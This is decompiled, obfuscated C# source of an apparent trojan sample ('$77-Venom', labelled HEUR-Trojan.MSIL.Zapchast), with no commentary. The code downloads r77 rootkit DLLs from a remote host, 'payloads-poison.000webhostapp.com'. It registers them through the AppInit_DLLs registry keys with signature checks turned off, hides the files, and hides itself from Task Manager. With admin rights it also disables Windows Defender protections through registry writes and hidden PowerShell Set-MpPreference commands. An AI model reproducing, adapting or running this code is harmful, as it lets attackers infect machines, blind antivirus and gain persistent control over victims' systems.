// Decompiled with JetBrains decompiler
// Type: 嗪拿�狭�齫�영쫠뜄ᚼ∲࿡趻吢዗熭㋅椌
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;

public class 嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7
{
  [DllImport("kernel32.dll", EntryPoint = "GetCurrentProcess")]
  public static extern IntPtr \u2208ç赩礠\uE084ꕋ\uA7C2켓\u2F7A\uEC99\u2760䭀\uF851侗\uFFFD䒭\u0085誌\uA82E꾅();

  public static void 鷷\uE72A캤釾\u2605偖륿⃑뇟\uEDE7\uFFFD컰䑜箉竝\uF830䀿哉嶤砹()
  {
    IntPtr num = 嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.\u2208ç赩礠\uE084ꕋ\uA7C2켓\u2F7A\uEC99\u2760䭀\uF851侗\uFFFD䒭\u0085誌\uA82E꾅();
    欏듲궽\uEC0A忱ᔙ뮏ᨖ姤肭罳訐௧ᔛ璱츽睳鸅투멻 忱ᔙ뮏ᨖ姤肭罳訐௧ᔛ璱츽睳鸅투멻 = new 欏듲궽\uEC0A忱ᔙ뮏ᨖ姤肭罳訐௧ᔛ璱츽睳鸅투멻(\uEF66䲀\u218A\uFFFD켞ﺠᕹӀ\u2B51簸삶ೌ뺵飞\uE04Eᯓ쏼唂㾩퍂.먙\uF8C2\uEE51ണℱꞭ汙\u28B3鹩ꤻ䛏ᶲ쀴쵼㪻ꬎ\uEFA5\u0BC9\uFFFD\uE33D((string) null, "Task Manager"));
    while (忱ᔙ뮏ᨖ姤肭罳訐௧ᔛ璱츽睳鸅투멻.lhWndParent != IntPtr.Zero)
    {
      Console.Write((object) num);
      string procName = Console.In.ReadLine();
      int index = 忱ᔙ뮏ᨖ姤肭罳訐௧ᔛ璱츽睳鸅투멻.鲸ݐ\u2E71밗\uFFFD巇賻૬\uFB1B\uFFFD鍼禣拫蠷䍎愹ᾧ谬흔桄(procName);
      忱ᔙ뮏ᨖ姤肭罳訐௧ᔛ璱츽睳鸅투멻.Ꮆ\u09A9Ë똔ꎭ줻鱀카Ꮇ\uF3BE殇\uE168㑓覠\uE111\uEE2A齣\u23EA橆녇(true);
      忱ᔙ뮏ᨖ姤肭罳訐௧ᔛ璱츽睳鸅투멻.鋼絺葳ꔴ랧锂\uF301嚫툈\uFFFD뱵犨퐑팞葉밧횵햱唷\uFFFD(index);
      忱ᔙ뮏ᨖ姤肭罳訐௧ᔛ璱츽睳鸅투멻.Ꮆ\u09A9Ë똔ꎭ줻鱀카Ꮇ\uF3BE殇\uE168㑓覠\uE111\uEE2A齣\u23EA橆녇(false);
    }
  }

  public static void 㳽㕶ꮄ\u300E䍂หꋗ័攐鄲蚨\u2434䖓㺌ᾖ祹ꙩ䈲ⴖ閗(bool is64bit)
  {
    string path1 = Path.Combine(윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.뚻\uA4AF벋뀇靯糄ᓹ䢓㥍群銥\u2FCA\uF07A\u2F30\uE400ྎ톄ꏘ뾘淓, 윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.䑓冹\uFFFD\u3190ꗎᓷ酈ₖ봤儇읐ꜚ髳ꮳ\u25B7躎ᦈ艊㞞\u3030);
    if (嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.웱\uE410连\uE581ᑓ鄁壠\uF860恌ᖖ탡\uE5A5\uFFFD擴몺ۂ짡ឮ\uEF9D諧())
    {
      string link = "https://payloads-poison.000webhostapp.com/r77-x86.dll";
      string name1 = "r77-x64.dll";
      string name2 = "r77-x86.dll";
      픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.쿟귆\u2F8E\uF1A8湣哸ӂ\uFFFD뫠怩젌拶馸ᢣ磦킢\u28C5氺鐺徺("https://payloads-poison.000webhostapp.com/r77-x64.dll", name1);
      픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.쿟귆\u2F8E\uF1A8湣哸ӂ\uFFFD뫠怩젌拶馸ᢣ磦킢\u28C5氺鐺徺(link, name2);
      string str1 = "x" + (is64bit ? 64 : 86).ToString() + ".dll";
      string str2 = Path.Combine(Path.GetTempPath(), "$77-" + Guid.NewGuid().ToString("N") + "-" + str1);
      File.Copy(Path.Combine(path1, "r77-" + str1), str2);
      new FileInfo(str2).Attributes |= FileAttributes.Temporary;
      using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, is64bit ? RegistryView.Registry64 : RegistryView.Registry32).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", true))
      {
        registryKey.SetValue("LoadAppInit_DLLs", (object) 1);
        registryKey.SetValue("RequireSignedAppInit_DLLs", (object) 0);
        registryKey.SetValue("AppInit_DLLs", (object) str2);
      }
      string path2 = Path.Combine(path1, "r77-x64.dll");
      string path3 = Path.Combine(path1, "r77-x86.dll");
      File.SetAttributes(path2, FileAttributes.Hidden);
      File.SetAttributes(path3, FileAttributes.Hidden);
    }
    else
    {
      string link = "https://payloads-poison.000webhostapp.com/r77-x86.dll";
      string name3 = "r77-x64.dll";
      string name4 = "r77-x86.dll";
      픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.쿟귆\u2F8E\uF1A8湣哸ӂ\uFFFD뫠怩젌拶馸ᢣ磦킢\u28C5氺鐺徺("https://payloads-poison.000webhostapp.com/r77-x64.dll", name3);
      픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.쿟귆\u2F8E\uF1A8湣哸ӂ\uFFFD뫠怩젌拶馸ᢣ磦킢\u28C5氺鐺徺(link, name4);
      string str3 = "x" + (is64bit ? 64 : 86).ToString() + ".dll";
      string str4 = Path.Combine(Path.GetTempPath(), "$77-" + Guid.NewGuid().ToString("N") + "-" + str3);
      File.Copy(Path.Combine(path1, "r77-" + str3), str4);
      new FileInfo(str4).Attributes |= FileAttributes.Temporary;
      using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, is64bit ? RegistryView.Registry64 : RegistryView.Registry32).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", true))
      {
        registryKey.SetValue("LoadAppInit_DLLs", (object) 1);
        registryKey.SetValue("RequireSignedAppInit_DLLs", (object) 0);
        registryKey.SetValue("AppInit_DLLs", (object) str4);
      }
      string path4 = Path.Combine(path1, "r77-x64.dll");
      string path5 = Path.Combine(path1, "r77-x86.dll");
      File.SetAttributes(path4, FileAttributes.Hidden);
      File.SetAttributes(path5, FileAttributes.Hidden);
    }
  }

  public static bool 웱\uE410连\uE581ᑓ鄁壠\uF860恌ᖖ탡\uE5A5\uFFFD擴몺ۂ짡ឮ\uEF9D諧() => new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);

  public static void 锄笌᧒ɿ둛鈊\uFFFD꧶\u2AD8캭齙쿤ᦄ\u29D8뫀邇䂹ﮕ훥뿓()
  {
    if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
      return;
    嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.쎬發ﭻᡶ\uFFFDἁ捇킣옳䳋춅\uFFFD묾㛖瞱挞桫\uFFFD怃\uFFFD("SOFTWARE\\Microsoft\\Windows Defender\\Features", "TamperProtection", "0");
    嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.쎬發ﭻᡶ\uFFFDἁ捇킣옳䳋춅\uFFFD묾㛖瞱挞桫\uFFFD怃\uFFFD("SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1");
    嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.쎬發ﭻᡶ\uFFFDἁ捇킣옳䳋춅\uFFFD묾㛖瞱挞桫\uFFFD怃\uFFFD("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1");
    嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.쎬發ﭻᡶ\uFFFDἁ捇킣옳䳋춅\uFFFD묾㛖瞱挞桫\uFFFD怃\uFFFD("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1");
    嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.쎬發ﭻᡶ\uFFFDἁ捇킣옳䳋춅\uFFFD묾㛖瞱挞桫\uFFFD怃\uFFFD("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
    嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.摖\uE42D\u0EFD괲律爪뒾캬㠁\u2327䴮ᣂ䗸\uE1BE燹苞疹鶿ʟ\u2803();
  }

  private static void 쎬發ﭻᡶ\uFFFDἁ捇킣옳䳋춅\uFFFD묾㛖瞱挞桫\uFFFD怃\uFFFD(
    string regPath,
    string name,
    string value)
  {
    try
    {
      using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
      {
        if (registryKey == null)
        {
          Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, (object) value, RegistryValueKind.DWord);
        }
        else
        {
          if (registryKey.GetValue(name) == (object) value)
            return;
          registryKey.SetValue(name, (object) value, RegistryValueKind.DWord);
        }
      }
    }
    catch
    {
    }
  }

  private static void 摖\uE42D\u0EFD괲律爪뒾캬㠁\u2327䴮ᣂ䗸\uE1BE燹苞疹鶿ʟ\u2803()
  {
    Process process = new Process()
    {
      StartInfo = new ProcessStartInfo()
      {
        FileName = "powershell",
        Arguments = "Get-MpPreference -verbose",
        UseShellExecute = false,
        RedirectStandardOutput = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true
      }
    };
    process.Start();
    while (!process.StandardOutput.EndOfStream)
    {
      string str = process.StandardOutput.ReadLine();
      if (str.StartsWith("DisableRealtimeMonitoring") && str.EndsWith("False"))
        嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.䈓墹型龀㸦澵\uE421븝䎸킣ꅫ\u2332醂Ǆ邊蕹졌ﬆ\u28B0䱷("Set-MpPreference -DisableRealtimeMonitoring $true");
      else if (str.StartsWith("DisableBehaviorMonitoring") && str.EndsWith("False"))
        嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.䈓墹型龀㸦澵\uE421븝䎸킣ꅫ\u2332醂Ǆ邊蕹졌ﬆ\u28B0䱷("Set-MpPreference -DisableBehaviorMonitoring $true");
      else if (str.StartsWith("DisableBlockAtFirstSeen") && str.EndsWith("False"))
        嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.䈓墹型龀㸦澵\uE421븝䎸킣ꅫ\u2332醂Ǆ邊蕹졌ﬆ\u28B0䱷("Set-MpPreference -DisableBlockAtFirstSeen $true");
      else if (str.StartsWith("DisableIOAVProtection") && str.EndsWith("False"))
        嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.䈓墹型龀㸦澵\uE421븝䎸킣ꅫ\u2332醂Ǆ邊蕹졌ﬆ\u28B0䱷("Set-MpPreference -DisableIOAVProtection $true");
      else if (str.StartsWith("DisablePrivacyMode") && str.EndsWith("False"))
        嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.䈓墹型龀㸦澵\uE421븝䎸킣ꅫ\u2332醂Ǆ邊蕹졌ﬆ\u28B0䱷("Set-MpPreference -DisablePrivacyMode $true");
      else if (str.StartsWith("SignatureDisableUpdateOnStartupWithoutEngine") && str.EndsWith("False"))
        嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.䈓墹型龀㸦澵\uE421븝䎸킣ꅫ\u2332醂Ǆ邊蕹졌ﬆ\u28B0䱷("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");
      else if (str.StartsWith("DisableArchiveScanning") && str.EndsWith("False"))
        嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.䈓墹型龀㸦澵\uE421븝䎸킣ꅫ\u2332醂Ǆ邊蕹졌ﬆ\u28B0䱷("Set-MpPreference -DisableArchiveScanning $true");
      else if (str.StartsWith("DisableIntrusionPreventionSystem") && str.EndsWith("False"))
        嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.䈓墹型龀㸦澵\uE421븝䎸킣ꅫ\u2332醂Ǆ邊蕹졌ﬆ\u28B0䱷("Set-MpPreference -DisableIntrusionPreventionSystem $true");
      else if (str.StartsWith("DisableScriptScanning") && str.EndsWith("False"))
        嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.䈓墹型龀㸦澵\uE421븝䎸킣ꅫ\u2332醂Ǆ邊蕹졌ﬆ\u28B0䱷("Set-MpPreference -DisableScriptScanning $true");
      else if (str.StartsWith("SubmitSamplesConsent") && !str.EndsWith("2"))
        嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.䈓墹型龀㸦澵\uE421븝䎸킣ꅫ\u2332醂Ǆ邊蕹졌ﬆ\u28B0䱷("Set-MpPreference -SubmitSamplesConsent 2");
      else if (str.StartsWith("MAPSReporting") && !str.EndsWith("0"))
        嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.䈓墹型龀㸦澵\uE421븝䎸킣ꅫ\u2332醂Ǆ邊蕹졌ﬆ\u28B0䱷("Set-MpPreference -MAPSReporting 0");
      else if (str.StartsWith("HighThreatDefaultAction") && !str.EndsWith("6"))
        嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.䈓墹型龀㸦澵\uE421븝䎸킣ꅫ\u2332醂Ǆ邊蕹졌ﬆ\u28B0䱷("Set-MpPreference -HighThreatDefaultAction 6 -Force");
      else if (str.StartsWith("ModerateThreatDefaultAction") && !str.EndsWith("6"))
        嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.䈓墹型龀㸦澵\uE421븝䎸킣ꅫ\u2332醂Ǆ邊蕹졌ﬆ\u28B0䱷("Set-MpPreference -ModerateThreatDefaultAction 6");
      else if (str.StartsWith("LowThreatDefaultAction") && !str.EndsWith("6"))
        嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.䈓墹型龀㸦澵\uE421븝䎸킣ꅫ\u2332醂Ǆ邊蕹졌ﬆ\u28B0䱷("Set-MpPreference -LowThreatDefaultAction 6");
      else if (str.StartsWith("SevereThreatDefaultAction") && !str.EndsWith("6"))
        嗪拿\uFFFD狭\uFFFD齫\uFFFD영쫠뜄ᚼ\u2232\u0FE1趻吢\u12D7熭\u32C5椌\uECF7.䈓墹型龀㸦澵\uE421븝䎸킣ꅫ\u2332醂Ǆ邊蕹졌ﬆ\u28B0䱷("Set-MpPreference -SevereThreatDefaultAction 6");
    }
  }

  private static void 䈓墹型龀㸦澵\uE421븝䎸킣ꅫ\u2332醂Ǆ邊蕹졌ﬆ\u28B0䱷(string args) => new Process()
  {
    StartInfo = new ProcessStartInfo()
    {
      FileName = "powershell",
      Arguments = args,
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true
    }
  }.Start();
}
